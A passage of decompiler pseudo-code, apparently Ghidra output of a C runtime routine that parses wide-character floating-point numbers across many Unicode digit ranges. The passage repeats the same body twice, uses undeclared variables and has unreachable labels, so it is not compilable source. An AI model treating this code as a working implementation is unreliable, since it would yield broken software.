0x660; \n                    } else {\n                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_3c) goto LAB_1001e886; \n                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_40) {\n                            unsignedIntegerValue = (ushort)(wchar_t)local_c - 0x6f0; \n                        } else {\n                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_44) goto LAB_1001e886; \n                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_48) {\n                                unsignedIntegerValue = (ushort)(wchar_t)local_c - 0x966; \n                            } else {\n                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_4c) goto LAB_1001e886; \n                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_50) {\n                                    unsignedIntegerValue = (ushort)(wchar_t)local_c - 0x9e6; \n                                } else {\n                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_54) goto LAB_1001e886; \n                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_58) {\n                                        unsignedIntegerValue = (ushort)(wchar_t)local_c - 0xa66; \n                                    } else {\n                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_5c) goto LAB_1001e886; \n                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_60) {\n                                            unsignedIntegerValue = (ushort)(wchar_t)local_c - 0xae6; \n                                        } else {\n                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_64) goto LAB_1001e886; \n                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_68) {\n                                                unsignedIntegerValue = (ushort)(wchar_t)local_c - 0xb66; \n                                            } else {\n                                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_6c) goto LAB_1001e886; \n                                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_70) {\n                                                    unsignedIntegerValue = (ushort)(wchar_t)local_c - 0xc66; \n                                                } else {\n                                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_74) goto LAB_1001e886; \n                                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_78) {\n                                                        unsignedIntegerValue = (ushort)(wchar_t)local_c - 0xce6; \n                                                    } else {\n                                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_7c) goto LAB_1001e886; \n                                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_80) {\n                                                            unsignedIntegerValue = (ushort)(wchar_t)local_c - 0xd66; \n                                                        } else {\n                                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_84) goto LAB_1001e886; \n                                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_88) {\n                                                                unsignedIntegerValue = (ushort)(wchar_t)local_c - 0xe50; \n                                                            } else {\n                                                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_8c) goto LAB_1001e886; \n                                                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_90) {\n                                                                    unsignedIntegerValue = (ushort)(wchar_t)local_c - 0xed0; \n                                                                } else {\n                                                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_94) goto LAB_1001e886; \n                                                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_98) {\n                                                                        unsignedIntegerValue = (ushort)(wchar_t)local_c - 0xf20; \n                                                                    } else {\n                                                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_9c) goto LAB_1001e886; \n                                                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_a0) {\n                                                                            unsignedIntegerValue = (ushort)(wchar_t)local_c - 0x1040; \n                                                                        } else {\n                                                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_a4) goto LAB_1001e886; \n                                                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_a8) {\n                                                                                unsignedIntegerValue = (ushort)(wchar_t)local_c - 0x17e0; \n                                                                            } else {\n                                                                                if (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_ac) || ((ushort)(wchar_t)local_b0 <= (ushort)(wchar_t)local_c)) goto LAB_1001e886; \n                                                                                unsignedIntegerValue = (ushort)(wchar_t)local_c - 0x1810; \n                                                                            }\n                                                                        }\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        \n        if (localCalculation < unsignedIntegerValue) goto LAB_1001e8f2; \n        bVar11 = true; \n        if (localPointer1 != localPointer2) { \n            *(char *)localPointer1 = (char)unsignedIntegerValue; \n            localPointer1 = (int *)((int)localPointer1 + 1); \n        }\n        localCounter = localCounter + 1; \n        local_c = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2); \n    } while (true); \nLAB_1001ef37:\n    localInteger = 0x1451; \nLAB_1001ef3e:\n    do {\n        \n        if ((ushort)(wchar_t)local_c < 0x30) {\nLAB_1001f0dc:\n            \n            if ((((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_b8) || ((ushort)(wchar_t)local_bc < (ushort)(wchar_t)local_c)) && ((ushort)local_14 < (ushort)((wchar_t)local_c - (short)local_10))) {\n                unsignedIntegerValue = 0xffffffff; \n            } else {\n                unsignedIntegerValue = (uint)(ushort)(wchar_t)local_c; \n                if ((ushort)((wchar_t)local_c - (short)local_10) <= (ushort)local_14) {\n                    unsignedIntegerValue = unsignedIntegerValue - 0x20; \n                }\n                unsignedIntegerValue = unsignedIntegerValue - 0x37; \n            }\n        } else {\n            integerValue = 0x30; \n            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_c0) {\nLAB_1001ef53:\n                unsignedIntegerValue = (uint)(ushort)(wchar_t)local_c - integerValue; \n            } else {\n                \n                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_30) {\n                    if (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_34) || ((integerValue = local_34, (ushort)(wchar_t)local_38 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_3c || ((integerValue = local_3c, (ushort)(wchar_t)local_40 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_44 || ((integerValue = local_44, (ushort)(wchar_t)local_48 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_4c || ((integerValue = local_4c, (ushort)(wchar_t)local_50 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_54 || ((integerValue = local_54, (ushort)(wchar_t)local_58 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_5c || ((integerValue = local_5c, (ushort)(wchar_t)local_60 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_64 || ((integerValue = local_64, (ushort)(wchar_t)local_68 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_6c || ((integerValue = local_6c, (ushort)(wchar_t)local_70 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_74 || ((integerValue = local_74, (ushort)(wchar_t)local_78 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_7c || ((integerValue = local_7c, (ushort)(wchar_t)local_80 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_84 || ((integerValue = local_84, (ushort)(wchar_t)local_88 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_8c || ((integerValue = local_8c, (ushort)(wchar_t)local_90 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_94 || ((integerValue = local_94, (ushort)(wchar_t)local_98 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_9c || ((integerValue = local_9c, (ushort)(wchar_t)local_a0 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_a4 || ((integerValue = local_a4, (ushort)(wchar_t)local_a8 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_ac || (integerValue = local_ac, (ushort)(wchar_t)local_b0 <= (ushort)(wchar_t)local_c)))))))))))))))))))))))))))))))\n                    ))))))) goto LAB_1001f0dc; \n                goto LAB_1001ef53; \n            }\n            integerValue = local_30; \n            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_b4) goto LAB_1001ef53; \n            unsignedIntegerValue = 0xffffffff; \n        }\n        \n        if (unsignedIntegerValue == 0xffffffff) goto LAB_1001f0dc; \n    } while (9 < unsignedIntegerValue); \n    local_c = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2); \n    if (bVar11) { \n        localInteger = -localInteger; \n    }\n    integerValue = localInteger; \n    if (!bVar2) { \n        characterValue = FID_conflict_operator__((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)&local_d0); \n        if (characterValue == '\\0') { \n            return 7; \n        }\n        local_c = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2); \n        integerValue = localInteger; \n    }\n    goto LAB_1001f15a; \nLAB_1001e8f2:\n    \n    if ((uint)(ushort)(wchar_t)local_c == (int)***(char ***)(*param_1 + 0x88)) {\n        local_c = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2); \n        integerValue = localCounter; \n        \n        if ((localPointer1 == param_3 + 2) && ((wchar_t)local_c == L'0')) {\n            bVar11 = true; \n            local_c = L'0'; \n            do {\n                integerValue = integerValue + -1; \n                local_c = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2); \n            } while ((wchar_t)local_c == L'0'); \n        }\n        do {\n            localCounter = integerValue; \n            \n            if ((ushort)(wchar_t)local_c < 0x30) goto LAB_1001eb79; \n            \n            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_c0) {\n                uVar9 = (ushort)(wchar_t)local_c - 0x30; \n            } else {\n                \n                if ((ushort)(wchar_t)local_30 <= (ushort)(wchar_t)local_c) {\n                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_b4) {\n                        uVar9 = (ushort)(wchar_t)local_c - 0xff10; \n                    } else {\n                        uVar9 = 0xffffffff; \n                    }\n                } else {\n                    if ((ushort)(wchar_t)local_34 <= (ushort)(wchar_t)local_c) {\n                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_38) {\n                            uVar9 = (ushort)(wchar_t)local_c - 0x660; \n                        } else {\n                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_3c) goto LAB_1001eb79; \n                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_40) {\n                                uVar9 = (ushort)(wchar_t)local_c - 0x6f0; \n                            } else {\n                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_44) goto LAB_1001eb79; \n                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_48) {\n                                    uVar9 = (ushort)(wchar_t)local_c - 0x966; \n                                } else {\n                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_4c) goto LAB_1001eb79; \n                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_50) {\n                                        uVar9 = (ushort)(wchar_t)local_c - 0x9e6; \n                                    } else {\n                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_54) goto LAB_1001eb79; \n                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_58) {\n                                            uVar9 = (ushort)(wchar_t)local_c - 0xa66; \n                                        } else {\n                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_5c) goto LAB_1001eb79; \n                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_60) {\n                                                uVar9 = (ushort)(wchar_t)local_c - 0xae6; \n                                            } else {\n                                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_64) goto LAB_1001eb79; \n                                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_68) {\n                                                    uVar9 = (ushort)(wchar_t)local_c - 0xb66; \n                                                } else {\n                                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_6c) goto LAB_1001eb79; \n                                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_70) {\n                                                        uVar9 = (ushort)(wchar_t)local_c - 0xc66; \n                                                    } else {\n                                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_74) goto LAB_1001eb79; \n                                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_78) {\n                                                            uVar9 = (ushort)(wchar_t)local_c - 0xce6; \n                                                        } else {\n                                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_7c) goto LAB_1001eb79; \n                                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_80) {\n                                                                uVar9 = (ushort)(wchar_t)local_c - 0xd66; \n                                                            } else {\n                                                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_84) goto LAB_1001eb79; \n                                                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_88) {\n                                                                    uVar9 = (ushort)(wchar_t)local_c - 0xe50; \n                                                                } else {\n                                                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_8c) goto LAB_1001eb79; \n                                                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_90) {\n                                                                        uVar9 = (ushort)(wchar_t)local_c - 0xed0; \n                                                                    } else {\n                                                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_94) goto LAB_1001eb79; \n                                                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_98) {\n                                                                            uVar9 = (ushort)(wchar_t)local_c - 0xf20; \n                                                                        } else {\n                                                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_9c) goto LAB_1001eb79; \n                                                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_a0) {\n                                                                                uVar9 = (ushort)(wchar_t)local_c - 0x1040; \n                                                                            } else {\n                                                                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_a4) goto LAB_1001eb79; \n                                                                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_a8) {\n                                                                                    uVar9 = (ushort)(wchar_t)local_c - 0x17e0; \n                                                                                } else {\n                                                                                    if (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_ac) || ((ushort)(wchar_t)local_b0 <= (ushort)(wchar_t)local_c)) goto LAB_1001eb79; \n                                                                                    uVar9 = (ushort)(wchar_t)local_c - 0x1810; \n                                                                                }\n                                                                            }\n                                                                        }\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n            goto LAB_1001eb74; \n        }\nLAB_1001eb79:\n        \n        if ((((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_b8) || ((ushort)(wchar_t)local_bc < (ushort)(wchar_t)local_c)) && ((ushort)local_14 < (ushort)((wchar_t)local_c - (short)local_10))) {\n            uVar9 = 0xffffffff; \n        } else {\n            uVar9 = (uint)(ushort)(wchar_t)local_c; \n            if ((ushort)((wchar_t)local_c - (short)local_10) <= (ushort)local_14) {\n                uVar9 = uVar9 - 0x20; \n            }\n            uVar9 = uVar9 - 0x37; \n        }\n        \n        if (unsignedIntegerValue < uVar9) break; \n        bVar11 = true; \n        if (localPointer1 != localPointer2) { \n            *(char *)localPointer1 = (char)uVar9; \n            localPointer1 = (int *)((int)localPointer1 + 1); \n        }\n        local_c = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2); \n        integerValue = localCounter; \n    } while (true); \n}\n*\\ \n \nuint __cdecl FUN_1001e3b3(int *param_1, int *param_2, int *param_3)\n{\n    char characterValue;\n    wchar_t wideCharacterValue;\n    undefined4 undefinedValue;\n    int integerValue;\n    uint unsignedIntegerValue;\n    uint localCalculation;\n    int localInteger;\n    int *localPointer1;\n    int *localPointer2;\n    int localCounter;\n    int localValue28;\n    int localValue2c;\n    localPointer1 = param_3 + 2;\n    undefinedValue = FUN_10023785(param_2);\n    if ((char)undefinedValue == '\\0') {\n        return 7;\n    }\n    localValue2c = param_2[4];\n    localValue28 = param_2[5];\n    wchar_t local_c = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2);\n    localPointer2 = param_3 + 0xc2;\n    *(bool *)localPointer2 = (wchar_t)local_c == L'-';\n    if (((wchar_t)local_c == L'-') || ((wchar_t)local_c == L'+')) {\n        local_c = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2);\n    }\n    if (((wchar_t)local_c == L'I') || ((wchar_t)local_c == L'i')) {\n        characterValue = parse_floating_point_possible_infinity<>((wchar_t *)&local_c, (input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2, localValue2c, localValue28);\n        return CONCAT31(extraout_var, characterValue);\n    }\n    if (((wchar_t)local_c == L'N') || ((wchar_t)local_c == L'n')) {\n        unsignedIntegerValue = parse_floating_point_possible_nan<>((wchar_t *)&local_c, (input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2, localValue2c, localValue28);\n        return unsignedIntegerValue;\n    }\n    localInteger = 0;\n    char localFlag = '\\0';\n    characterValue = '\\0';\n    if ((wchar_t)local_c == L'0') {\n        integerValue = param_2[4];\n        wideCharacterValue = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2);\n        if ((wideCharacterValue == L'x') || (wideCharacterValue == L'X')) {\n            localFlag = '\\x01';\n            local_c = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2);\n            localValue2c = integerValue;\n        } else {\n            __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::unget((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2, wideCharacterValue);\n        }\n    }\n    bool bVar11 = false;\n    localCounter = 0;\n    if ((wchar_t)local_c == L'0') {\n        bVar11 = true;\n        do {\n            local_c = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2);\n        } while ((wchar_t)local_c == L'0');\n    }\n    localCalculation = ((characterValue == '\\0') - 1 & 6) + 9;\n    do {\n        if ((ushort)(wchar_t)local_c < 0x30) goto LAB_1001e886;\n        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_c0) {\n            unsignedIntegerValue = (ushort)(wchar_t)local_c - 0x30;\n        } else {\n            if ((ushort)(wchar_t)local_30 <= (ushort)(wchar_t)local_c) {\n                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_b4) {\n                    unsignedIntegerValue = (ushort)(wchar_t)local_c - 0xff10;\n                } else {\n                    unsignedIntegerValue = 0xffffffff;\n                }\n            } else {\n                if ((ushort)(wchar_t)local_34 <= (ushort)(wchar_t)local_c) {\n                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_38) {\n                        unsignedIntegerValue = (ushort)(wchar_t)local_c - 0x660;\n                    } else {\n                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_3c) goto LAB_1001e886;\n                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_40) {\n                            unsignedIntegerValue = (ushort)(wchar_t)local_c - 0x6f0;\n                        } else {\n                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_44) goto LAB_1001e886;\n                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_48) {\n                                unsignedIntegerValue = (ushort)(wchar_t)local_c - 0x966;\n                            } else {\n                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_4c) goto LAB_1001e886;\n                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_50) {\n                                    unsignedIntegerValue = (ushort)(wchar_t)local_c - 0x9e6;\n                                } else {\n                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_54) goto LAB_1001e886;\n                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_58) {\n                                        unsignedIntegerValue = (ushort)(wchar_t)local_c - 0xa66;\n                                    } else {\n                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_5c) goto LAB_1001e886;\n                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_60) {\n                                            unsignedIntegerValue = (ushort)(wchar_t)local_c - 0xae6;\n                                        } else {\n                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_64) goto LAB_1001e886;\n                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_68) {\n                                                unsignedIntegerValue = (ushort)(wchar_t)local_c - 0xb66;\n                                            } else {\n                                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_6c) goto LAB_1001e886;\n                                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_70) {\n                                                    unsignedIntegerValue = (ushort)(wchar_t)local_c - 0xc66;\n                                                } else {\n                                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_74) goto LAB_1001e886;\n                                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_78) {\n                                                        unsignedIntegerValue = (ushort)(wchar_t)local_c - 0xce6;\n                                                    } else {\n                                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_7c) goto LAB_1001e886;\n                                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_80) {\n                                                            unsignedIntegerValue = (ushort)(wchar_t)local_c - 0xd66;\n                                                        } else {\n                                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_84) goto LAB_1001e886;\n                                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_88) {\n                                                                unsignedIntegerValue = (ushort)(wchar_t)local_c - 0xe50;\n                                                            } else {\n                                                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_8c) goto LAB_1001e886;\n                                                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_90) {\n                                                                    unsignedIntegerValue = (ushort)(wchar_t)local_c - 0xed0;\n                                                                } else {\n                                                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_94) goto LAB_1001e886;\n                                                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_98) {\n                                                                        unsignedIntegerValue = (ushort)(wchar_t)local_c - 0xf20;\n                                                                    } else {\n                                                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_9c) goto LAB_1001e886;\n                                                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_a0) {\n                                                                            unsignedIntegerValue = (ushort)(wchar_t)local_c - 0x1040;\n                                                                        } else {\n                                                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_a4) goto LAB_1001e886;\n                                                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_a8) {\n                                                                                unsignedIntegerValue = (ushort)(wchar_t)local_c - 0x17e0;\n                                                                            } else {\n                                                                                if (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_ac) || ((ushort)(wchar_t)local_b0 <= (ushort)(wchar_t)local_c)) goto LAB_1001e886;\n                                                                                unsignedIntegerValue = (ushort)(wchar_t)local_c - 0x1810;\n                                                                            }\n                                                                        }\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        if (localCalculation < unsignedIntegerValue) goto LAB_1001e8f2;\n        bVar11 = true;\n        if (localPointer1 != localPointer2) {\n            *(char *)localPointer1 = (char)unsignedIntegerValue;\n            localPointer1 = (int *)((int)localPointer1 + 1);\n        }\n        localCounter = localCounter + 1;\n        local_c = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2);\n    } while (true);\nLAB_1001ef37:\n    localInteger = 0x1451;\nLAB_1001ef3e:\n    do {\n        if ((ushort)(wchar_t)local_c < 0x30) {\nLAB_1001f0dc:\n            if ((((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_b8) || ((ushort)(wchar_t)local_bc < (ushort)(wchar_t)local_c)) && ((ushort)local_14 < (ushort)((wchar_t)local_c - (short)local_10))) {\n                unsignedIntegerValue = 0xffffffff;\n            } else {\n                unsignedIntegerValue = (uint)(ushort)(wchar_t)local_c;\n                if ((ushort)((wchar_t)local_c - (short)local_10) <= (ushort)local_14) {\n                    unsignedIntegerValue = unsignedIntegerValue - 0x20;\n                }\n                unsignedIntegerValue = unsignedIntegerValue - 0x37;\n            }\n        } else {\n            integerValue = 0x30;\n            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_c0) {\nLAB_1001ef53:\n                unsignedIntegerValue = (uint)(ushort)(wchar_t)local_c - integerValue;\n            } else {\n                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_30) {\n                    if (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_34) || ((integerValue = local_34, (ushort)(wchar_t)local_38 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_3c || ((integerValue = local_3c, (ushort)(wchar_t)local_40 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_44 || ((integerValue = local_44, (ushort)(wchar_t)local_48 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_4c || ((integerValue = local_4c, (ushort)(wchar_t)local_50 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_54 || ((integerValue = local_54, (ushort)(wchar_t)local_58 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_5c || ((integerValue = local_5c, (ushort)(wchar_t)local_60 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_64 || ((integerValue = local_64, (ushort)(wchar_t)local_68 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_6c || ((integerValue = local_6c, (ushort)(wchar_t)local_70 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_74 || ((integerValue = local_74, (ushort)(wchar_t)local_78 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_7c || ((integerValue = local_7c, (ushort)(wchar_t)local_80 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_84 || ((integerValue = local_84, (ushort)(wchar_t)local_88 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_8c || ((integerValue = local_8c, (ushort)(wchar_t)local_90 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_94 || ((integerValue = local_94, (ushort)(wchar_t)local_98 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_9c || ((integerValue = local_9c, (ushort)(wchar_t)local_a0 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_a4 || ((integerValue = local_a4, (ushort)(wchar_t)local_a8 <= (ushort)(wchar_t)local_c && (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_ac || (integerValue = local_ac, (ushort)(wchar_t)local_b0 <= (ushort)(wchar_t)local_c)))))))))))))))))))))))))))))))\n                    ))))))) goto LAB_1001f0dc;\n                goto LAB_1001ef53;\n            }\n            integerValue = local_30;\n            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_b4) goto LAB_1001ef53;\n            unsignedIntegerValue = 0xffffffff;\n        }\n        if (unsignedIntegerValue == 0xffffffff) goto LAB_1001f0dc;\n    } while (9 < unsignedIntegerValue);\n    local_c = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2);\n    if (bVar11) {\n        localInteger = -localInteger;\n    }\n    integerValue = localInteger;\n    if (!bVar2) {\n        characterValue = FID_conflict_operator__((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)&local_d0);\n        if (characterValue == '\\0') {\n            return 7;\n        }\n        local_c = 